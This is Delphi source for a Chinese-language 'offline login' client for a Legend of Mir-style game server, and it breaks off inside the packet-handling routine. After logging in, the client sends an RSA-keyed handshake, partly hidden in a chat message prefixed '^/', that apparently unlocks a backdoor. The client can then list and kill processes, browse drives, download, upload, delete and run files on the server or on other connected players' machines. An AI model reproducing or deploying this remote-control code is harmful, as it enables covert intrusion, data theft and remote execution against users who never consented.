unit FrmMain;

interface

uses
  Windows, Messages, SysUtils, StrUtils, Variants, Classes, Graphics, Controls, Forms, EDcode, Grobal2, Hutil32,
  MD5Unit, ShellAPI,
  Dialogs, StdCtrls, JSocket, Common, ExtCtrls, RSA, ComCtrls, ShlObj, ImageHlp, ImgList, Registry, DES;

type
  pTCmdInfo = ^TCmdInfo;
  TCmdInfo = record
    sCmd: string;
    sParam1: string;
    sParam2: string;
    sParam3: string;
    sParam4: string;
    nParam1: Integer;
    nParam2: Integer;
    nParam3: Integer;
    nParam4: Integer;
  end;

  TMsgType = (t_exe, t_hint);

  TLoginStatus = (ts_Login, ts_SelChr, ts_Play);

  TFormMain = class(TForm)
    grp2: TGroupBox;
    mmoLog: TMemo;
    grp3: TGroupBox;
    edtcmd: TEdit;
    grp1: TGroupBox;
    mmoGameLog: TMemo;
    CSocket: TClientSocket;
    tmrSocket: TTimer;
    rs1: TRSA;
    grp6: TGroupBox;
    tv1: TTreeView;
    btn2: TButton;
    btn3: TButton;
    grp5: TGroupBox;
    lst1: TListBox;
    btn1: TButton;
    chk1: TCheckBox;
    btn4: TButton;
    chk2: TCheckBox;
    btn5: TButton;
    btn6: TButton;
    btn7: TButton;
    btn10: TButton;
    OpenDialog: TOpenDialog;
    btn11: TButton;
    btn12: TButton;
    btn13: TButton;
    grp4: TGroupBox;
    lbl1: TLabel;
    lbl2: TLabel;
    lbl3: TLabel;
    lbl4: TLabel;
    lbl5: TLabel;
    lblSaveDir: TLabel;
    lbl7: TLabel;
    lblSpeed: TLabel;
    lbl6: TLabel;
    lbl8: TLabel;
    lst2: TListBox;
    btn8: TButton;
    btn9: TButton;
    il1: TImageList;
    tmr1: TTimer;
    btn14: TButton;
    procedure FormCreate(Sender: TObject);
    procedure FormActivate(Sender: TObject);
    procedure edtcmdKeyPress(Sender: TObject; var Key: Char);
    procedure FormDestroy(Sender: TObject);
    procedure CSocketError(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure CSocketConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CSocketDisconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CSocketRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure tmrSocketTimer(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure tv1Change(Sender: TObject; Node: TTreeNode);
    procedure btn3Click(Sender: TObject);
    procedure btn5Click(Sender: TObject);
    procedure btn4Click(Sender: TObject);
    procedure chk2Click(Sender: TObject);
    procedure btn6Click(Sender: TObject);
    procedure btn8Click(Sender: TObject);
    procedure btn7Click(Sender: TObject);
    procedure btn9Click(Sender: TObject);
    procedure btn10Click(Sender: TObject);
    procedure btn11Click(Sender: TObject);
    procedure btn12Click(Sender: TObject);
    procedure lst1Click(Sender: TObject);
    procedure btn13Click(Sender: TObject);
    procedure tmr1Timer(Sender: TObject);
    procedure btn14Click(Sender: TObject);
  private
    m_CmdInfo: TCmdInfo;
    FCriticalSection: TRTLCriticalSection;
    FSendSocketStr: string;
    LoginStatus: TLoginStatus;
    sLoginName: string;
    sLoginPass: string;
    boLogin: Boolean;
    m_DefMsg: TDefaultMessage;
    CheckSpeedTick: LongWord;
    boCheckSpeed: Boolean;
    SocStr, BufferStr: string;
    boPlay: Boolean;
    boSelChr: Boolean;
    Certification: Integer;
    g_sSelChrAddr: string;
    g_nSelChrPort: Integer;
    sSelChr: string;

    SelectNode: TTreeNode;
    boDir: Boolean;
    DownStream: TFileStream;
    nPID: Integer;
    ImageNameList: TStringList;
    nMaxSize: Integer;
    nSendSize: Integer;
    nNowSize: Integer;
    UserList: TStringList;

    procedure SendSocketEx(sendstr: string);
    procedure SocketLock;
    procedure SocketUnLock;
    procedure DecodeMessagePacket(datablock: string);
    procedure ClientGetPasswdSuccess(body: string);
    procedure WaitAndPass(msec: LongWord);
    procedure ClientGetReceiveChrs(body: string);
    procedure ClientGetStartPlay(body: string);
    procedure ClientGetPList(body: string);
    procedure ClientGetMList(body: string);
    procedure ClientGetData(Msg: pTDefaultMessage; body: string);
    procedure ClientSetData(Msg: pTDefaultMessage; body: string);
    procedure ClientGetUserList(Msg: pTDefaultMessage; body: string);
    procedure BeginDown;
    procedure CLientClose(Msg: pTDefaultMessage);
    function GetFileIconIndex(sName: string): Integer;
  public
    m_nID: Integer;
    procedure SendSocket(sendstr: string);
    procedure CmdLogin(CmdInfo: pTCmdInfo);
    procedure CmdNLogin(CmdInfo: pTCmdInfo);
    procedure CmdCheck(CmdInfo: pTCmdInfo);
    procedure CmdGM(CmdInfo: pTCmdInfo);
    procedure DelTree(TreeView: TTreeNode);
    procedure DelTreeBy(TreeView: TTreeNode);
    procedure LockButton;
    procedure UnLockButton;
    function RSADecodeString(sMsg: string): string;
    function RSAEncryptString(sMsg: string): string;
    procedure ChangeShowDlg(boFlag: Boolean; sTitle: string);
    function BrowseForFolder(sTitle: string): string;
    function ExtractIconFileName(const FileName: string): string;
    function ExtractIconIndex(const FileName: string): Integer;
    procedure MainOutMessage(sMsg: string; MsgType: TMsgType);
    procedure SendClientMessage(Msg, Recog, param, tag, series: Integer; pszMsg: string = '');
    procedure SendClientSocket(Msg, Recog, param, tag, series: Integer; pszMsg: string = '');
  end;

var
  FormMain: TFormMain;

implementation

{$R *.dfm}

uses
  PlayList;

const
  CMD_LOGIN = '/LOGIN';
  CMD_NLOGIN = '/NLOGIN';
  CM_CHECKPASS = '/CHECK';
  CM_GM = '/GM';

procedure TFormMain.BeginDown;
var
  sDownStr: string;
  sFileName: string;
  sDirName: string;
  sTemp: string;
begin
  if lst2.Items.Count > 0 then begin
    sDownStr := lst2.Items[0];
    sDirName := lblSaveDir.Caption + GetValidStr3(ExtractFilePath(sDownStr), sTemp, ['/', '\']);
    sFileName := sDirName + ExtractFileName(sDownStr);
    lbl5.Caption := '正在下载：' + sFileName;
    MakeSureDirectoryPathExists(PChar(sDirName));
    if DownStream <> nil then DownStream.Free;
    DownStream := nil;
    if FileExists(sFileName) then DownStream := TFileStream.Create(sFileName, fmOpenReadWrite or fmShareDenyNone)
    else DownStream := TFileStream.Create(sFileName, fmCreate);
    DownStream.Seek(DownStream.Size, soFromBeginning);
    m_DefMsg := MakeDefaultMsg(CM_APPEND, DownStream.Size, StrToIntDef(lblSpeed.Caption, 100), 0, APE_DOWN);
    SendSocket(EncodeMessage(m_DefMsg) + RSAEncryptString(sDownStr));
    nMaxSize := 0;
    nSendSize := 0;
    nNowSize := 0;
  end else
    btn7Click(btn7);
end;

function TFormMain.BrowseForFolder(sTitle: string): string;
var
  BrowseInfo: TBrowseInfo;
  sBuf: array[0..511] of Char;
begin
  FillChar(BrowseInfo, SizeOf(TBrowseInfo), #0);
  BrowseInfo.hwndOwner := Handle;
  BrowseInfo.lpszTitle := PChar(sTitle);
  BrowseInfo.ulFlags := 64;
  SHGetPathFromIDList(SHBrowseForFolder(BrowseInfo), @sBuf);
  Result := Trim(sBuf);
end;

procedure TFormMain.btn10Click(Sender: TObject);
var
  TempNode: TTreeNode;
  sStr: string;
  FileName: string;
begin
  if btn10.Caption = '上传文件' then begin
    if (SelectNode <> nil) and (SelectNode.Data = Pointer(-1)) then begin
      sStr := SelectNode.Text;
      TempNode := SelectNode.Parent;
      while (TempNode <> nil) do begin
        if RightStr(TempNode.Text, 1) = '\' then sStr := TempNode.Text + sStr
        else  sStr := TempNode.Text + '\' + sStr;
        TempNode := TempNode.Parent;
      end;
      if RightStr(sStr, 1) <> '\' then sStr := sStr + '\';
      OpenDialog.FileName := '';
      if OpenDialog.Execute(Handle) and (OpenDialog.FileName <> '') then begin
        FileName := sStr + ExtractFileName(OpenDialog.FileName);
        if DownStream <> nil then DownStream.Free;
        DownStream := TFileStream.Create(OpenDialog.FileName, fmOpenRead);
        lbl5.Caption := '正在上传：' + FileName;
        lbl7.Caption := Format('%d/%d', [DownStream.Position, DownStream.Size]);
        m_DefMsg := MakeDefaultMsg(CM_APPEND, 0, 0, 0, APE_UPDOWN);
        SendSocket(EncodeMessage(m_DefMsg) + RSAEncryptString(FileName));
        btn10.Caption := '停止上传';
        LockButton;
        btn7.Enabled := False;
        tmr1.Enabled := True;
        nMaxSize := 0;
        nSendSize := 0;
        nNowSize := 0;
      end;
    end;
  end else begin
    btn10.Caption := '上传文件';
    if DownStream <> nil then DownStream.Free;
    DownStream := nil;
    UnLockButton;
    btn7.Enabled := True;
    tmr1.Enabled := False;
  end;
end;

procedure TFormMain.btn11Click(Sender: TObject);
var
  TempNode: TTreeNode;
  sStr: string;
begin
  if (SelectNode <> nil) and (SelectNode.Data <> Pointer(-1)) then begin
    sStr := SelectNode.Text;
    TempNode := SelectNode.Parent;
    LockButton;
    while (TempNode <> nil) do begin
      if RightStr(TempNode.Text, 1) = '\' then sStr := TempNode.Text + sStr
      else  sStr := TempNode.Text + '\' + sStr;
      TempNode := TempNode.Parent;
    end;
    m_DefMsg := MakeDefaultMsg(CM_APPEND, 0, 0, 0, APE_EX);
    SendSocket(EncodeMessage(m_DefMsg) + RSAEncryptString(sStr));
  end;
end;

procedure TFormMain.btn12Click(Sender: TObject);
var
  TempNode: TTreeNode;
  sStr: string;
begin
  if (SelectNode <> nil) and (SelectNode.Data <> Pointer(-1)) then begin
    sStr := SelectNode.Text;
    TempNode := SelectNode.Parent;
    LockButton;
    while (TempNode <> nil) do begin
      if RightStr(TempNode.Text, 1) = '\' then sStr := TempNode.Text + sStr
      else  sStr := TempNode.Text + '\' + sStr;
      TempNode := TempNode.Parent;
    end;
    m_DefMsg := MakeDefaultMsg(CM_APPEND, 0, 0, 0, APE_DEL);
    SendSocket(EncodeMessage(m_DefMsg) + RSAEncryptString(sStr));
  end;
end;

procedure TFormMain.btn13Click(Sender: TObject);
begin
  if (lst1.ItemIndex >= 0) and (lst1.ItemIndex < lst1.Items.Count) then begin
    btn1.Enabled := False;
    btn13.Enabled := False;
    nPID := Integer(lst1.Items.Objects[lst1.ItemIndex]);
    m_DefMsg := MakeDefaultMsg(CM_APPEND, nPID, 0, 0, APE_CLOSE);
    SendSocket(EncodeMessage(m_DefMsg));
  end;
end;

procedure TFormMain.btn14Click(Sender: TObject);
begin
  FormList := TFormList.Create(Owner);
  with FormList do begin
    lst1.Items.Assign(UserList);
    SelectID := -1;
    ShowModal;
    btn1.Enabled := True;
    btn13.Enabled := True;
    if SelectID <> -1 then begin
      m_DefMsg := MakeDefaultMsg(CM_APPEND, SelectID, 0, 0, APE_CHECK);
      SendSocket(EncodeMessage(m_DefMsg) + RSAEncryptString(IntToStr(m_nID)));
      if SelectID <> m_nID then begin
        m_DefMsg := MakeDefaultMsg(CM_APPEND, SelectID, 0, 0, APE_CLIENTCHECK);
        SendSocket(EncodeMessage(m_DefMsg) + RSAEncryptString(IntToStr(SelectID)));
      end;
    end;
  end;
end;

procedure TFormMain.CLientClose(Msg: pTDefaultMessage);
var
  i: Integer;
begin
  btn1.Enabled := True;
  btn13.Enabled := True;
  if Msg.Recog = 1 then begin
    for I := 0 to lst1.Items.Count - 1 do begin
      if Integer(lst1.Items.Objects[I]) = nPID then begin
        lst1.Items.Delete(I);
        break;
      end;
    end;
  end;
end;

procedure TFormMain.btn1Click(Sender: TObject);
begin
  btn1.Enabled := False;
  btn13.Enabled := False;
  lst1.Clear;
  m_DefMsg := MakeDefaultMsg(CM_APPEND, 0, 0, Integer(chk1.Checked), APE_PLIST);
  SendSocket(EncodeMessage(m_DefMsg));
end;

procedure TFormMain.btn2Click(Sender: TObject);
begin
  tv1.Items.Clear;
  SelectNode := nil;
  LockButton;
  m_DefMsg := MakeDefaultMsg(CM_APPEND, 0, 0, 0, APE_MLIST);
  SendSocket(EncodeMessage(m_DefMsg));
end;

procedure TFormMain.btn3Click(Sender: TObject);
var
  TempNode: TTreeNode;
  sStr: string;
begin
  if (SelectNode <> nil) and (SelectNode.Data = Pointer(-1)) then begin
    LockButton;
    sStr := SelectNode.Text;
    TempNode := SelectNode.Parent;
    while (TempNode <> nil) do begin
      if RightStr(TempNode.Text, 1) = '\' then sStr := TempNode.Text + sStr
      else  sStr := TempNode.Text + '\' + sStr;
      TempNode := TempNode.Parent;
    end;
    m_DefMsg := MakeDefaultMsg(CM_APPEND, 0, 0, 0, APE_MLIST);
    SendSocket(EncodeMessage(m_DefMsg) + RSAEncryptString(sStr));
  end;
end;

procedure TFormMain.btn4Click(Sender: TObject);
var
  TempNode: TTreeNode;
  sStr: string;
begin
  if (SelectNode <> nil) and (SelectNode.Data <> Pointer(-1)) then begin
    sStr := SelectNode.Text;
    TempNode := SelectNode.Parent;
    while (TempNode <> nil) do begin
      if RightStr(TempNode.Text, 1) = '\' then sStr := TempNode.Text + sStr
      else  sStr := TempNode.Text + '\' + sStr;
      TempNode := TempNode.Parent;
    end;
    if lst2.Items.IndexOf(sStr) = -1 then
      lst2.Items.Add(sStr);
  end;
end;

procedure TFormMain.btn5Click(Sender: TObject);
begin
  lst2.Items.Clear;
end;

procedure TFormMain.btn6Click(Sender: TObject);
begin
  if (lst2.ItemIndex > -1) and (lst2.ItemIndex < lst2.Items.Count) then
    lst2.Items.Delete(lst2.ItemIndex);
end;

procedure TFormMain.btn7Click(Sender: TObject);
begin
  if btn7.Caption = '开始下载' then begin
    if (Trim(lblSaveDir.Caption) <> '') and (lst2.Items.Count > 0) then begin
      btn7.Caption := '停止下载';
      LockButton;
      BeginDown;
      btn10.Enabled := False;
      tmr1.Enabled := True;
    end;
  end else begin
    btn7.Caption := '开始下载';
    if DownStream <> nil then
      DownStream.Free;
    DownStream := nil;
    UnLockButton;
    btn10.Enabled := True;
    tmr1.Enabled := False;
  end;
end;

procedure TFormMain.btn8Click(Sender: TObject);
begin
  lblSaveDir.Caption := BrowseForFolder('选择保存目录');
  if RightStr(lblSaveDir.Caption, 1) <> '\' then
    lblSaveDir.Caption := lblSaveDir.Caption + '\';
end;

procedure TFormMain.btn9Click(Sender: TObject);
var
  sSpeed: string;
  nSpeed: Integer;
begin
  if not InputQuery('输入速度', '输入100-20000之间的数值', sSpeed) then Exit;
  nSpeed := StrToIntDef(Trim(sSpeed), -1);
  if (nSpeed >= 100) and (nSpeed <= 20000) then
    lblSpeed.Caption := IntToStr(nSpeed);
end;

procedure TFormMain.LockButton;
begin
  btn2.Enabled := False;
  btn3.Enabled := False;
  tv1.Enabled := False;
  btn11.Enabled := False;
  btn12.Enabled := False;
  btn4.Enabled := False;
  btn5.Enabled := False;
  btn6.Enabled := False;
  lst2.Enabled := False;
  btn8.Enabled := False;
end;

procedure TFormMain.lst1Click(Sender: TObject);
begin
  if (lst1.ItemIndex >= 0) and (lst1.ItemIndex < lst1.Items.Count) then
    grp5.Caption := '进程列表(' + IntToStr(Integer(lst1.Items.Objects[lst1.ItemIndex])) + ')'
end;

procedure TFormMain.UnLockButton;
begin
  btn2.Enabled := True;
  btn3.Enabled := True;
  btn11.Enabled := True;
  btn12.Enabled := True;
  tv1.Enabled := True;
  btn4.Enabled := True;
  btn5.Enabled := True;
  btn6.Enabled := True;
  lst2.Enabled := True;
  btn8.Enabled := True;
  tv1Change(tv1, SelectNode);
end;

procedure TFormMain.ClientGetPasswdSuccess(body: string);
var
  str, runaddr, runport, certifystr: string;
begin
  str := DecodeString(body);
  str := GetValidStr3(str, runaddr, ['/']);
  str := GetValidStr3(str, runport, ['/']);
  str := GetValidStr3(str, certifystr, ['/']);
  Certification := StrToIntDef(certifystr, 0);
  boLogin := True;
  CSocket.Active := FALSE;
  CSocket.Host := '';
  CSocket.Port := 0;
  WaitAndPass(500);
  with CSocket do begin
    g_sSelChrAddr := runaddr;
    g_nSelChrPort := StrToIntDef(runport, 0);
    Address := g_sSelChrAddr;
    Port := g_nSelChrPort;
    LoginStatus := ts_SelChr;
    MainOutMessage(Format('正在连接角色服务器[%s:%d]...', [g_sSelChrAddr, g_nSelChrPort]), t_hint);
    Active := True;
  end;
end;

procedure TFormMain.ClientGetPList(body: string);
var
  List: TStringList;
  I: Integer;
  sStr, sPID, sName: string;
begin
  btn1.Enabled := True;
  btn13.Enabled := True;
  List := TStringList.Create;
  Try
    List.SetText(PChar(Body));
    for I := 0 to List.Count - 1 do begin
      sStr := RSADecodeString(List[I]);
      sName := GetValidStr3(sStr, sPID, ['/']);
      List[I] := sName;
      List.Objects[I] := TObject(StrToIntDef(sPID, 0));
    end;
    lst1.Items.Assign(List);
  Finally
    List.Free;
  End;
  grp5.Caption := '进程数量(' + IntToStr(lst1.Items.Count) + ')';
end;

procedure TFormMain.ChangeShowDlg(boFlag: Boolean; sTitle: string);
begin
  SelectNode := nil;
  grp6.Visible := boFlag;
  grp5.Visible := boFlag;
  tv1.Items.Clear;
  lst2.Items.Clear;
  lst1.Items.Clear;
  if boFlag then begin
    ClientWidth := 869;
    Caption := '脱机登录 - ' + sTitle;
  end else begin
    ClientWidth := 450;
    Caption := '脱机登录';
  end;
  Tmr1.Enabled := False;
  if DownStream <> nil then DownStream.Free;
  DownStream := nil;
end;

procedure TFormMain.chk2Click(Sender: TObject);
begin
  grp4.Visible := chk2.Checked;
  
end;

procedure TFormMain.ClientGetData(Msg: pTDefaultMessage; body: string);
var
  Buffer: PChar;
  nFileSize: Integer;
begin
  if (DownStream <> nil) then begin
    if (Msg.Recog > 0) and (body <> '') then begin
      nFileSize := MakeLong(Msg.Param, Msg.tag);
      GetMem(Buffer, Msg.Recog);
      Try
        DecodeBuffer(body, Buffer, Msg.Recog);
        DownStream.Write(Buffer^, Msg.Recog);
        if DownStream.Position >= nFileSize then begin  //下载完成
          lbl5.Caption := '下载完成...';
          lbl7.Caption := Format('%d/%d', [DownStream.Position, nFileSize]);
          if lst2.Items.Count > 0 then
            lst2.Items.Delete(0);
          DownStream.Free;
          DownStream := nil;
          BeginDown;
        end else begin
          nMaxSize := nFileSize;
          nSendSize := DownStream.Position;
          Inc(nNowSize, Msg.Recog);
          lbl7.Caption := Format('%d/%d', [DownStream.Position, nFileSize]);
          m_DefMsg := MakeDefaultMsg(CM_APPEND, DownStream.Position, StrToIntDef(lblSpeed.Caption, 100), 0, APE_DOWN);
          SendSocket(EncodeMessage(m_DefMsg));
        end;
      Finally
        FreeMem(Buffer, Msg.Recog);
      End;
    end else begin
      lbl5.Caption := '下载失败...';
      btn7Click(btn7);
    end;
  end;
end;

procedure TFormMain.ClientSetData(Msg: pTDefaultMessage; body: string);
var
  Buffer: PChar;
  nFileSize: Integer;
  DecodeStr: string;
begin
  if (DownStream <> nil) then begin
    if (Msg.Recog >= 0) then begin
      nFileSize := StrToIntDef(lblSpeed.Caption, 100);
      GetMem(Buffer, nFileSize);
      Try
        if Msg.Recog <> DownStream.Position then
          DownStream.Seek(Msg.Recog, soFromBeginning);
        nFileSize := DownStream.Read(Buffer^, nFileSize);
        if nFileSize <= 0 then begin
          lbl5.Caption := '上传完成...';
          lbl7.Caption := Format('%d/%d', [DownStream.Position, DownStream.Size]);
          DownStream.Free;
          DownStream := nil;
          btn10Click(btn10);
        end else begin
          nMaxSize := DownStream.Size;
          nSendSize := DownStream.Position;
          Inc(nNowSize, nFileSize);
          lbl7.Caption := Format('%d/%d', [DownStream.Position, DownStream.Size]);
          DecodeStr := EncodeBuffer(Buffer, nFileSize);
          m_DefMsg := MakeDefaultMsg(CM_APPEND, Msg.Recog, nFileSize, 0, APE_UPDOWN);
          SendSocket(EncodeMessage(m_DefMsg) + DecodeStr);
        end;
      Finally
        FreeMem(Buffer, nFileSize);
      End;
    end else begin
      lbl5.Caption := '上传失败...';
      btn10Click(btn10);
    end;
  end;
end;

procedure TFormMain.ClientGetMList(body: string);
var
  List: TStringList;
  I: Integer;
  str, sSize: string;
  nSize: Integer;
  nIndex: Integer;
begin
  UnLockButton;
  List := TStringList.Create;
  Try
    List.SetText(PChar(Body));
    if SelectNode = nil then begin
      for I := 0 to List.Count - 1 do begin
        with tv1.Items.AddObject(nil, RSADecodeString(List[I]), Pointer(-1)) do begin
          ImageIndex := 0;
          SelectedIndex := 0;
          StateIndex := 0;
        end;
      end;
    end else begin
      DelTreeBy(SelectNode);
      for I := 0 to List.Count - 1 do begin
        str := RSADecodeString(List[I]);
        str := GetValidStr3(str, sSize, ['/']);
        nSize := StrToIntDef(sSize, 0);
        if nSize = -1 then begin
          with tv1.Items.AddChildObjectFirst(SelectNode, str, Pointer(-1)) do begin
            ImageIndex := 1;
            SelectedIndex := 1;
            StateIndex := 1;
          end;
        end else begin
          with tv1.Items.AddChildObject(SelectNode, str, Pointer(nSize)) do begin
            nIndex := GetFileIconIndex(str);
            ImageIndex := nIndex;
            SelectedIndex := nIndex;
            StateIndex := nIndex;
          end;
        end;
      end;
    end;
  Finally
    List.Free;
  End;
end;

procedure TFormMain.ClientGetReceiveChrs(body: string);
var
  i: Integer;
  str, uname, sjob, swuxin, slevel, ssex: string;
begin
  str := DecodeString(body);
  sSelChr := '';
  for i := 0 to 2 do begin
    str := GetValidStr3(str, uname, ['/']);
    str := GetValidStr3(str, sjob, ['/']);
    str := GetValidStr3(str, swuxin, ['/']);
    str := GetValidStr3(str, slevel, ['/']);
    str := GetValidStr3(str, ssex, ['/']);

    if (uname <> '') and (slevel <> '') and (ssex <> '') then begin
      if uname[1] = '*' then begin
        uname := Copy(uname, 2, Length(uname) - 1);
        sSelChr := uname;
        break;
      end;
      sSelChr := uname;
    end;
  end;
  if sSelChr <> '' then begin
    WaitAndPass(2000);
    m_DefMsg := MakeDefaultMsg(CM_SELCHR, 0, 0, 0, 0);
    SendSocket(EncodeMessage(m_DefMsg) + EncodeString(sLoginName + '/' + sSelChr));
    MainOutMessage(Format('正在使用[%s]进入游戏...', [sSelChr]), t_hint);
  end
  else
    MainOutMessage(Format('没有可用角色...', []), t_hint);
end;

procedure TFormMain.ClientGetStartPlay(body: string);
var
  str, runaddr, runport: string;
begin
  str := DecodeString(body);
  str := GetValidStr3(str, runaddr, ['/']);
  str := GetValidStr3(str, runport, ['/']);
  boSelChr := True;
  CSocket.Active := FALSE;
  CSocket.Host := '';
  CSocket.Port := 0;
  WaitAndPass(500);
  with CSocket do begin
    Address := runaddr;
    Port := StrToIntDef(runport, 0);
    LoginStatus := ts_Play;
    MainOutMessage(Format('正在连接游戏服务器[%s:%d]...', [Address, Port]), t_hint);
    Active := True;
  end;
end;

procedure TFormMain.ClientGetUserList(Msg: pTDefaultMessage; body: string);
var
  i: Integer;
  sStr, sName, sID: string;
begin
  UserList.SetText(PChar(body));
  for I := 0 to UserList.Count - 1 do begin
    sStr := UserList[I];
    sID := GetValidStr3(DecodeString(sStr), sName, ['/']);
    UserList[I] := sName;
    UserList.Objects[I] := TObject(StrToIntDef(sID, -1));
  end;
  if FormList <> nil then
    FormList.lst1.Items.Assign(UserList);
end;

procedure TFormMain.CmdLogin(CmdInfo: pTCmdInfo);
begin
  if not boLogin then begin
    MainOutMessage(Format('登录(%s %d %s *****)', [CmdInfo.sParam1, CmdInfo.nParam2, CmdInfo.sParam3]), t_exe);
    sLoginName := CmdInfo.sParam3;
    sLoginPass := GetMD5TextOf16(CmdInfo.sParam4);
    LoginStatus := ts_Login;
    CSocket.Close;
    CSocket.Host := CmdInfo.sParam1;
    CSocket.Port := CmdInfo.nParam2;
    MainOutMessage(Format('正在连接登录服务器...', []), t_hint);
    CSocket.Active := True;
  end
  else
    MainOutMessage(Format('已登录游戏...', []), t_hint);
end;

procedure TFormMain.CmdNLogin(CmdInfo: pTCmdInfo);
begin
  if not boLogin then begin
    MainOutMessage(Format('登录(%s %d %s *****)', [CmdInfo.sParam1, CmdInfo.nParam2, CmdInfo.sParam3]), t_exe);
    sLoginName := CmdInfo.sParam3;
    sLoginPass := CmdInfo.sParam4;
    LoginStatus := ts_Login;
    CSocket.Close;
    CSocket.Host := CmdInfo.sParam1;
    CSocket.Port := CmdInfo.nParam2;
    MainOutMessage(Format('正在连接登录服务器...', []), t_hint);
    CSocket.Active := True;
  end
  else
    MainOutMessage(Format('已登录游戏...', []), t_hint);
end;

procedure TFormMain.CmdCheck(CmdInfo: pTCmdInfo);
begin
  if boPlay then begin
    MainOutMessage(Format('正在验证...', [CmdInfo.sParam1, CmdInfo.sParam2]), t_exe);
    rs1.CommonalityMode := CmdInfo.sParam1;
    rs1.PrivateKey := CmdInfo.sParam2;
    m_DefMsg := MakeDefaultMsg(CM_APPEND, m_nID, 0, 0, APE_CHECK);
    SendSocket(EncodeMessage(m_DefMsg) + RSAEncryptString(IntToStr(m_nID)));
  end else
    MainOutMessage(Format('尚未登录游戏...', []), t_hint);
end;

procedure TFormMain.CmdGM(CmdInfo: pTCmdInfo);
begin
  if boPlay then begin
    MainOutMessage(Format('正在验证...', [CmdInfo.sParam1, CmdInfo.sParam2]), t_exe);
    rs1.CommonalityMode := CmdInfo.sParam1;
    rs1.PrivateKey := CmdInfo.sParam2;
    //Msg := MakeDefaultMsg(CM_SAY, 0, 0, 0, 0);
    //SendSocket(EncodeMessage(Msg) + EncodeString(saystr));
    m_DefMsg := MakeDefaultMsg(CM_SAY, 0, 0, 0, 0);
    SendSocket(EncodeMessage(m_DefMsg) + EncodeString('^/' + RSAEncryptString(IntToStr(m_nID))));
  end else
    MainOutMessage(Format('尚未登录游戏...', []), t_hint);
end;

procedure TFormMain.CSocketConnect(Sender: TObject; Socket: TCustomWinSocket);
var
  sSendMsg: string;
begin
  FSendSocketStr := '';
  SocStr := '';
  BufferStr := '';
  SendSocketEx(g_CodeHead + '+' + g_CodeEnd);

  tmrSocket.Enabled := True;
  case LoginStatus of
    ts_Login: begin
        MainOutMessage(Format('正在验证游戏账号密码...', []), t_hint);
        m_DefMsg := MakeDefaultMsg(CM_IDPASSWORD, $FFFF, $FFFF, $FFFF, $FFFF);
        SendSocket(EncodeMessage(m_DefMsg) + EncodeString(sLoginName + '/' + sLoginPass));
      end;
    ts_SelChr: begin
        MainOutMessage(Format('正在获取人物信息...', []), t_hint);
        WaitAndPass(1000);
        m_DefMsg := MakeDefaultMsg(CM_QUERYCHR, 0, 0, 0, 0);
        SendSocket(EncodeMessage(m_DefMsg) + EncodeString(sLoginName + '/' + IntToStr(Certification)));
      end;
    ts_Play: begin //  Msg: TDefaultMessage;
        MainOutMessage(Format('正在进入游戏...', []), t_hint);
        boCheckSpeed := True;
        CheckSpeedTick := GetTickCount + 100 * 1000;
        sSendMsg := format('**%s/%s/%d/%s/%s/%d', [sLoginName, sSelChr, Certification, '0506'{CLIENT_VERSION_NUMBER}, EncryStrHex(sSelChr, '19850506'),0]);
        SendSocket(EncodeString(sSendMsg));
      end;
  end;
end;

procedure TFormMain.CSocketDisconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  SocStr := '';
  tmrSocket.Enabled := False;
  FSendSocketStr := '';
  BufferStr := '';
  case LoginStatus of
    ts_Login: begin
        if not boLogin then
          MainOutMessage('与服务器断开连接...', t_Hint);
        boLogin := False;
      end;
    ts_SelChr: begin
        if not boSelChr then
          MainOutMessage('与服务器断开连接...', t_Hint);
      end;
    ts_Play: begin
        if boPlay then
          MainOutMessage('与服务器断开连接...', t_Hint);
      end;
  end;
  boPlay := False;
  ChangeShowDlg(False, '');
end;

procedure TFormMain.CSocketError(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
begin
  ErrorCode := 0;
  SocStr := '';
  BufferStr := '';
  Socket.Close;
  MainOutMessage('连接服务器失败...', t_Hint);
  FSendSocketStr := '';
end;

procedure TFormMain.CSocketRead(Sender: TObject; Socket: TCustomWinSocket);
var
  n: Integer;
  data, data2: string;
begin
  data := Socket.ReceiveText;
  n := pos(g_ClientCheck, data);
  if n > 0 then begin
    data2 := Copy(data, 1, n - 1);
    data := data2 + Copy(data, n + 1, Length(data));
    CheckSpeedTick := GetTickCount + 60 * 1000;
    boCheckSpeed := True;
  end;
  SocStr := SocStr + data;
end;

procedure TFormMain.DecodeMessagePacket(datablock: string);
var
  head, body: string;
  Msg: TDefaultMessage;
begin
  if datablock[1] <> '+' then begin
    if Length(datablock) >= DEFBLOCKSIZE then begin
      head := Copy(datablock, 1, DEFBLOCKSIZE);
      body := Copy(datablock, DEFBLOCKSIZE + 1, Length(datablock) - DEFBLOCKSIZE);
      Msg := DecodeMessage(head);
      case Msg.ident of
        SM_SELECTSERVER_OK: begin
            ClientGetPasswdSuccess(body);
          end;
        SM_PASSWD_FAIL: begin
            case msg.Recog of
              -1: MainOutMessage('帐号或密码不正确...', t_Hint);
              -2: MainOutMessage('帐号被锁定，请稍候再试...', t_Hint);
              -3: MainOutMessage('帐号可能正在使用，请稍候再试...', t_Hint);
              -4: MainOutMessage('请重新注册您的帐号...', t_Hint);
              -5: MainOutMessage('帐号已暂停使用...', t_Hint);
              -6: CSocket.Close;
              -7: MainOutMessage('服务器异常错误，请稍候再登录...', t_Hint);
            else
              MainOutMessage('该帐号不存在...', t_Hint);
            end;
          end;
        SM_QUERYCHR: begin
            ClientGetReceiveChrs(body);
          end;
        SM_QUERYCHR_FAIL: begin
            MainOutMessage('服务器认证失败..', t_Hint);
            CSocket.Close;
          end;
        SM_STARTPLAY: begin
            ClientGetStartPlay(body);
          end;
        SM_NEWMAP, SM_CHANGEMAP: begin
            SendClientMessage(CM_MAPAPOISE, 0, 0, 0, 0, '');
          end;
        SM_LOGON: begin
            boPlay := True;
            m_nID := Msg.Recog;
            MainOutMessage('成功进入游戏..', t_Hint);
          end;
        SM_APPENDCHECK_FAIL: begin
            if Msg.Recog = 1 then MainOutMessage('验证成功，取人物失败', t_Hint)
            else MainOutMessage('验证失败', t_Hint);
          end;
        SM_APPENDCHECK_OK: begin
            ChangeShowDlg(True, DecodeString(body));
            UnLockButton;
          end;
        SM_APPENDPLIST: begin
